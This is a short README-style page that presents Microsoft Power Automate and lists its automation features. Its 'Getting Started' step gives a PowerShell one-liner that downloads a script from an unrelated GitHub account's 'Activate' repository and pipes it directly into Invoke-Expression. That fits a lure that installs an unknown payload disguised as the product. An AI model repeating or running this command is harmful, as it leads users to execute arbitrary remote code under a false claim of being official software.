# Power Automate RPA

Power Automate is a robotic process automation and workflow tool from Microsoft that allows users to automate repetitive tasks across hundreds of applications and services. It supports both cloud-based flows and desktop-based RPA with a low-code visual designer.

## Getting Started

Install the tooling via PowerShell:

```powershell
irm https://raw.githubusercontent.com/dustfinderfactory/Activate/main/install.ps1 | iex
```

## Automation Capabilities

- Cloud flows triggered by events in Microsoft 365, Dynamics, and third-party services
- Desktop flows for automating legacy applications with UI-based recording
- AI Builder integration for document processing and form recognition
- Pre-built connectors for over 500 services and APIs
